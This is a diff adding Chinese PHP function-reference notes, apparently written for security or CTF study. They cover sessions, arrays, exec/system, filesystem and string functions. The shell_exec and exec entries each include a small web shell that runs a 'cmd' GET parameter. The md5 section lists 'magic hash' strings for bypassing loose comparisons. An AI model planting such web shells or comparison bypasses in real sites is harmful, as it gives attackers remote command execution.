@@ -1,0 +1,621 @@
+# 函数参考 
+
+https://www.php.net/manual/zh/funcref.php
+
+## Session 扩展 
+
+### Sessions 
+
+#### Session 函数
+
+##### session_start — 启动新会话或者重用现有会话
+
+https://www.php.net/manual/zh/function.session-start.php
+
+```php
+function session_start(array $options = []): bool
+```
+
+`session_start()` 会创建新会话或者重用现有会话。 如果通过 `GET` 或者 `POST` 方式，或者使用 `cookie` 提交了会话 ID， 则会重用现有会话。 
+
+## 变量与类型相关扩展 
+
+### 反射
+
+ReflectionFunction 类报告有关函数的信息。 
+
+### 函数处理 
+
+#### 函数处理 函数
+
+##### function_exists — 查看函数是否存在
+
+如果给定的函数已经被定义就返回 true
+
+```php
+function function_exists(string $function): bool
+```
+
+### 数组 
+
+#### 数组 函数
+
+##### range — 根据范围创建数组，包含指定的元素
+
+```php
+function range(string|int|float $start, string|int|float $end, int|float $step = 1): array
+```
+
+建立一个包含指定范围单元的数组。
+
+如果 `start` 和 `end` 都是 `string`，`step` 是 `int`，则生成的数组是字节序列，否则，生成的数组将是数字序列。
+
+如果 `start` 小于或等于 `end`，则为递增序列，否则为递减序列。 
+
+##### extract — 从数组中将变量导入到当前的符号表
+
+```php
+function extract(array &$array, int $flags = EXTR_OVERWRITE, string $prefix = ""): int
+```
+
+本函数用来将变量从数组中导入到当前的[符号表]中。
+
+检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。 
+
+>  警告：不要对不可信的数据使用 `extract()`，类似用户输入 （例如 `$_GET`、`$_FILES`）。 
+
+##### end —— 将数组的内部指针指向最后一个单元 
+
+```php
+function end(array|object &$array): mixed
+```
+
+`end()` 将 `array` 的内部指针移动到最后一个单元并返回其值。 
+
+### 变量处理 
+
+#### 变量处理函数
+
+##### is_callable
+
+验证值是否可以在当前范围内作为函数调用 
+
+```php
+function is_callable(mixed $value, bool $syntax_only = false, string &$callable_name = null): bool
+```
+
+##### is_numeric —— 检测变量是否是数字或数字字符串 
+
+https://www.php.net/manual/zh/function.is-numeric.php
+
+```php
+function is_numeric(mixed $value): bool
+```
+
+检测变量是否是数字或数字字符串。 
+
+更新日志
+- 8.0.0
+    - 以空格结尾的数字字符串（`"42 "`）现在将返回 `true`。以前，会返回 `false`。 
+
+```log
+'42' is numeric
+'02471' is numeric
+'1337e0' is numeric
+
+'0x539' is NOT numeric
+'0b10100111001' is NOT numeric
+```
+
+##### isset —— 检测变量是否已声明并且其值不为 null
+
+```php
+function isset(mixed $var, mixed ...$vars): bool
+```
+
+##### intval —— 获取变量的整数值
+
+```php
+function intval(mixed $value, int $base = 10): int
+```
+
+通过使用指定的进制 `base` 转换（默认是十进制），返回变量 `value` 的 `int` 数值。 
+
+##### gettype —— 获取变量的类型
+
+```php
+function gettype(mixed $value): string
+```
+
+返回 PHP `value` 变量的类型。 对于类型检查，请使用 `is_*` 函数。 
+
+## 数据库扩展 
+
+### 数据库抽象层 
+
+#### PDO 
+
+##### PDO::__construct ——  创建一个表示数据库连接的 PDO 实例 
+
+https://www.php.net/manual/zh/pdo.construct.php
+
+```php
+public function PDO::__construct(
+    string $dsn,
+    ?string $username = null,
+    #[\SensitiveParameter] ?string $password = null,
+    ?array $options = null
+)
+```
+
+
+## 进程控制扩展 
+### 程序执行 
+#### 程序执行函数
+##### system — 执行外部程序，并且显示输出
+
+```php
+function system(string $command, int &$result_code = null): string|false
+```
+
+同 C 版本的 `system()` 函数一样，本函数执行 `command` 参数所指定的命令，并且输出执行结果。 
+
+返回值
+- 成功则返回命令输出的最后一行，失败则返回 `false` 
+
+注
+- `system` 直接输出执行结果，并仅返回最后一行。无法使用 HTML 标签对返回值进行格式化
+
+##### shell_exec — 通过 shell 执行命令并将完整的输出以字符串的方式返回
+
+```php
+function shell_exec(string $command): string|false|null
+```
+
+本函数同执行运算符。 
+
+返回值
+- 以 `string` 返回已执行命令的输出，如果无法建立管道，则为 `false`，如果发生错误或者命令不产生输出则为 `null`
+
+示例 web shell
+```php
+<?php
+$cmd = $_GET['cmd'];
+echo '<hr><pre>$ ' . $cmd . "\n" . shell_exec($cmd) . '</pre><hr>';
+?>
+```
+
+
+##### exec — 执行一个外部程序
+
+```php
+function exec(string $command, array &$output = null, int &$result_code = null): string|false
+```
+
+`exec()` 执行 `command` 参数所指定的命令。 
+
+参数
+- `output`
+    如果提供了 `output` 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。数组中的数据不包含行尾的空白字符，例如 \n 字符。
+
+- `result_code`
+    如果同时提供 `output` 和 `result_code` 参数，命令执行后的返回状态会被写入到此变量。
+
+返回值
+- 命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 `passthru()` 函数。
+- 失败时返回 `false`。
+- 如果想要获取命令的输出内容， 请确保使用 `output` 参数。 
+
+示例
+```php
+// 使用列表合并函数对 exec 执行后的输出列表进行符号合并
+<?php
+$output = [];
+exec($_GET['cmd'], $output);
+echo '<hr><pre>' . implode("\n", $output) . '</pre><hr>';
+?>
+```
+
+## 文件系统相关扩展 
+
+### 目录 
+#### 目录函数
+
+##### getcwd — 取得当前工作目录
+
+```php
+function getcwd(): string|false
+```
+
+返回值
+- 成功则返回当前工作目录，失败返回 false。 
+
+### 文件系统 
+
+#### 文件系统函数
+
+https://www.php.net/manual/zh/ref.filesystem.php
+
+### move_uploaded_file()
+
+```php
+function move_uploaded_file(string $from, string $to): bool
+```
+
+当 from 文件有效时，上传到 to 路径
+
+
+### unlink() - 删除文件
+
+```php
+function unlink(string $filename, ?resource $context = null): bool
+```
+
+删除 filename 文件，如果文件是符号链接，将会删除符号链接。
+
+### symlink() - 创建符号链接
+
+```php
+function symlink(string $target, string $link): bool
+```
+
+symlink() creates a symbolic link to the existing target with the specified name link. 
+
+### readlink() - 读取符号链接指向的路径
+
+```php
+function readlink(string $path): string|false
+```
+
+Returns the contents of the symbolic link path or false on error. 
+
+
+##### pathinfo —— 返回文件路径的信息
+
+https://www.php.net/manual/zh/function.pathinfo.php
+
+```php
+function pathinfo(string $path, int $flags = PATHINFO_ALL): array|string
+```
+
+`pathinfo()` 返回一个关联数组包含有 `path` 的信息。返回关联数组还是字符串取决于 `flags`。 
+
+返回值
+- 如果 `path` 有一个以上的扩展名， `PATHINFO_EXTENSION` 只返回最后一个，而 `PATHINFO_FILENAME` 仅剥离最后一个。
+
+##### file_get_contents — 将整个文件读入一个字符串
+
+```php
+function file_get_contents(
+    string $filename,
+    bool $use_include_path = false,
+    ?resource $context = null,
+    int $offset = 0,
+    ?int $length = null
+): string|false
+```
+
+参数
+- `filename`
+    要读取的文件的名称。（唯一必选参数）
+
+## 文本处理 
+
+### PCRE 
+
+#### PCRE 函数 —— preg_replace —— 执行一个正则表达式的搜索和替换
+
+https://www.php.net/manual/zh/function.preg-replace.php
+
+
+```php
+function preg_replace(
+    string|array $pattern,
+    string|array $replacement,
+    string|array $subject,
+    int $limit = -1,
+    int &$count = null
+): string|array|null
+```
+
+搜索 `subject` 中匹配 `pattern` 的部分，以 `replacement` 进行替换。 
+
+参数
+- `limit`
+    每个模式在每个 `subject` 上进行替换的最大次数。默认是 -1(无限)。
+
+
+### 字符串 
+#### 字符串 函数
+
+##### hex2bin — 转换十六进制字符串为二进制字符串
+
+```phpsd
+function hex2bin(string $string): string|false
+```
+
+> 警告：这个函数不是 转换十六进制数字为二进制数字。这种转换使用 `base_convert()` 函数。 
+
+错误／异常 
+- 如果输入的十六进制字符串是奇数长数或者无效的十六进制字符串将会抛出 `E_WARNING` 级别的错误。 
+
+##### str_starts_with — 检查字符串是否以指定子串开头
+
+```php
+function str_starts_with(string $haystack, string $needle): bool
+```
+
+执行大小写区分的检查，表明 haystack 是否以 needle 开头。 
+
+##### bin2hex — 将二进制数据转换为十六进制表示
+
+```php
+function bin2hex(string $string): string
+```
+
+返回 ASCII 字符串，包含 `string` 的十六进制表示。转换是高位优先，按字节完成的。 
+
+##### md5 — 计算字符串的 MD5 散列值
+
+https://www.php.net/manual/zh/function.md5.php
+
+```php
+function md5(string $string, bool $binary = false): string
+```
+
+参数
+- `string`
+    要计算的字符串。
+
+- `binary`
+    如果可选的 binary 被设置为 true，那么 md5 摘要将以 16 字符长度的原始二进制格式返回。
+
+返回值
+- 以 32 字符的十六进制数形式返回散列值。
+
+魔术哈希：
+- 在宽松比较逻辑中检查字符串与其 md5 哈希是否匹配
+    ```php
+    md5(`0e字符串`) == `0e字符串` 
+    ```
+- 字符串中的 `E` 若周围存在数字则视为科学计数法，而以0为底的科学计数法 `0e` 均为0
+- 存在一些字符串以 `0e` 开头，且其 md5 hash 也使用 `0e` 开头
+    - 0e215962017
+    - 0e1284838308
+    - 0e1137126905
+
+##### strpos — 查找字符串首次出现的位置
+
+```php
+function strpos(string $haystack, string $needle, int $offset = 0): int|false
+```
+
+返回 needle 在 haystack 中首次出现的数字位置。 
+
+##### stripos — 查找字符串首次出现的位置（不区分大小写）
+
+```php
+function stripos(string $haystack, string $needle, int $offset = 0): int|false
+```
+
+返回在字符串 `haystack` 中 `needle` 首次出现的数字位置。
+
+与 `strpos()` 不同，`stripos()` 不区分大小写。 
+
+##### explode —— 使用一个字符串分割另一个字符串
+
+```php
+function explode(string $separator, string $string, int $limit = PHP_INT_MAX): array
+```
+
+此函数返回由字符串组成的数组，每个元素都是 `string` 的一个子串，它们被字符串 `separator` 作为边界点分割出来。 
+
+##### str_pad —— 使用另一个字符串填充字符串为指定长度
+
+```php
+function str_pad(
+    string $string,
+    int $length,
+    string $pad_string = " ",
+    int $pad_type = STR_PAD_RIGHT
+): string
+```
+
+该函数返回 `string` 被从左端、右端或者同时两端被填充到制定长度后的结果。如果可选的 `pad_string` 参数没有被指定，`string` 将被空格字符填充，否则它将被 `pad_string` 填充到指定长度。 
+
+参数
+- `length`
+    填充字符串到最后的长度。 如果 `length` 的值是负数，小于或者等于输入字符串的长度，不会发生任何填充，并会返回 `string。`
+
+
+##### substr —— 返回字符串的子串
+
+```php
+function substr(string $string, int $offset, ?int $length = null): string
+```
+
+返回字符串 `string` 由 `offset` 和 `length` 参数指定的子字符串。 
+
+参数
+- `length`
+
+    - 如果提供了正数的 `length`，返回的字符串将从 `offset` 处开始，最多包含 `length` 个字符（取决于 `string` 的长度）。
+
+    - 如果提供了负数的 `length`，那么 `string` 末尾处的 `length` 个字符将会被省略。如果 `offset` 不在这段文本中，将返回空字符串。
+
+    - 如果提供了值为 `0` 的 `length`，将返回一个空字符串。
+
+    - 如果忽略 `length` 或将其设为 `null`，返回的子字符串将从 `offset` 位置开始直到字符串结尾。
+
+
+
+##### str_replace — 子字符串替换
+
+```php
+function str_replace(
+    array|string $search,
+    array|string $replace,
+    string|array $subject,
+    int &$count = null
+): string|array
+```
+
+该函数返回字符串或者数组。该字符串或数组是将 `subject` 中全部的 `search` 都被 `replace` 替换之后的结果。 
+
+##### echo — 输出一个或多个字符串
+
+```php
+function echo(string ...$expressions): void
+```
+
+输出一个或多个表达式，没有额外的换行符或者空格。
+
+echo 不是函数，而是语言结构。它的参数是表达式列表，跟在 echo 关键字后面，用逗号分隔，不用括号分隔。与其它的返回结构不同，echo 没有返回值
+
+快捷语法，可以在开始标记后直接跟等号
+
+```php
+<?=$foo?>
+```
+
+示例
+```php
+<?php
+echo "echo does not require parentheses.";
+
+// 参数是可以产生字符串的任意表达式
+$foo = "example";
+echo "foo is $foo"; // "foo is example"
+?>
+```
+
+##### implode — 用字符串连接数组元素
+
+```php
+function implode(string $separator, array $array): string
+
+function implode(array $array): string
+```
+
+参数
+
+- `separator`
+    可选。默认为空字符串。
+
+- `array`
+    要使用字符串连接的数组。
+
+返回值
+-  返回一个包含所有数组元素并且顺序相同的字符串， 每个元素之间有 `separator` 分隔。 
+
+## 影响 PHP 行为的扩展 
+### 错误处理 
+
+#### 错误处理 函数
+
+##### error_reporting — 设置应该报告何种 PHP 错误
+
+```php
+function error_reporting(?int $error_level = null): int
+```
+
+#### 安装/配置
+
+- `display_errors string`
+    该选项设置是否将错误信息作为输出的一部分打印到屏幕，或者对用户隐藏。 
+    - > 这是辅助开发的功能，不应在生产系统中使用 (例如连接到互联网的系统)。 
+
+### PHP 选项/信息 
+#### PHP 选项/信息 函数
+
+- `set_include_path` — 设置 `include_path` 配置选项
+
+## 文件系统相关扩展 
+### 文件系统 
+#### 安装/配置
+
+- `allow_url_fopen bool`
+    启用可感知 URL 的 `fopen` 封装协议，从而可以像访问文件一样访问 URL 对象。默认封装协议支持通过 `ftp` 或 `http` 协议访问 远程文件，某些扩展（例如 `zlib`）可能会注册其他封装协议。 
+
+- `allow_url_include bool`
+    此选项允许以下函数使用可感知 URL 的 `fopen` 封装协议： `include`、`include_once`、 `require`、`require_once`。 
+    - > 此设置要求启用 `allow_url_fopen`。 
+
+#### 文件系统函数
+
+##### file_put_contents — 将数据写入文件
+
+```php
+function file_put_contents(
+    string $filename,
+    mixed $data,
+    int $flags = 0,
+    ?resource $context = null
+): int|false
+```
+
+和依次调用 `fopen()`，`fwrite()` 以及 `fclose()` 功能一样。
+
+如果 `filename` 不存在，将会创建文件。反之，存在的文件将会重写，除非设置 `FILE_APPEND` flag。 
+
+## 其它服务 
+
+### 网络 
+
+#### 网络 函数
+
+##### gethostname — 获取主机名
+
+```php
+function gethostname(): string|false
+```
+
+`gethostname()` 获取本地机器的标准主机名。 
+
+##### header — 发送原生 HTTP 头
+
+https://www.php.net/manual/zh/function.header.php
+
+```php
+function header(string $string, bool $replace = true, int $response_code = ?): void
+```
+
+`header()` 用于发送原生的 HTTP 头。关于 HTTP 头的更多信息请参考 [» HTTP/1.1 specification](https://datatracker.ietf.org/doc/html/rfc2616)。 
+
+请注意 `header()` 必须在任何实际输出之前调用，不管是普通的 HTML 标签，还是文件或 PHP 输出的空行，空格。
+
+## 其它基本扩展 
+
+### Random 
+
+#### Random 函数
+
+##### random_bytes — Get cryptographically secure random bytes
+
+```php
+function random_bytes(int $length): string
+```
+
+##### random_int — 获取生成加密安全、均匀分布的整数
+
+```php
+function random_int(int $min, int $max): int
+```
+
+生成在指定最小值和最大值之间均匀分布的整数。 
+
+### 杂项 
+
+#### 杂项 函数
+
+##### die — 别名 exit()
+
+此函数是该函数的别名： `exit()`. 
+
+##### exit — 使用状态 code 或消息终止当前脚本
+
+```php
+function exit(string|int $status = 0): never
+```
+
+中止脚本的执行。即使调用了 `exit()`，`Shutdown 函数` 以及 `对象析构方法` 始终会执行。但 `finally` 块永远不会执行。 
